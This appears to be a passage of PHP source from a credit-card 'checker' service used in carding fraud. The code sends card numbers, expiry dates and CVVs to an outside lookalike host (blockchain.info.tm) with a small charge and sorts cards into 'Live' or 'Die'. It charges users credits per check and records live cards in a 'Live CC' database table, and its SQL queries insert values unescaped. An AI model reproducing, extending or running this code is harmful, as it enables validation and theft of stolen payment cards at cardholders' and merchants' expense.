...
$ccnum1 = str_replace("LIVE","",$ccnum1);
if ($ccnum1 == 0) {
header('location: http://blockchain.info.tm');
break;
}
...
$hasil = file_get_contents('http://blockchain.info.tm/api/Proccess-Card.php?ccn='.$num.'&ccm='.$expm.'&ccy='.$expy.'&cvv='.$cvv.'&charge='.$charge.'&api='.$api);
$a = json_decode($hasil, true);
$b = $a['status'];
if ($b == 1) {
$aq = mysql_query("UPDATE `user` SET `credits`=credits-3 WHERE email='$email'");
while($row = mysql_fetch_assoc($exe)){
$credits = $row['credits'];                    
}
$credits = $credits-3;
echo '{"error":0,"msg":"<font color=green><b>Live</b></font> | '.$format.' | [CRE:'.$credits.'] ./BKCN"}';
$wq = mysql_query("INSERT INTO `Live CC`(`fornum`,`gate`,`charge`,`author`,`date`) VALUES ('$format','Gate 3','$charge Cent','$email','$date')");
break;
} if ($b == 2) {
echo '{"error":2,"msg":"<font color=red><b>Die</b></font> | '.$format.' | [CRE:'.$credits.'] [Reason: Card Was Declined]"}';
break;
} if ($b == 3) {
if ($stat == 1) {
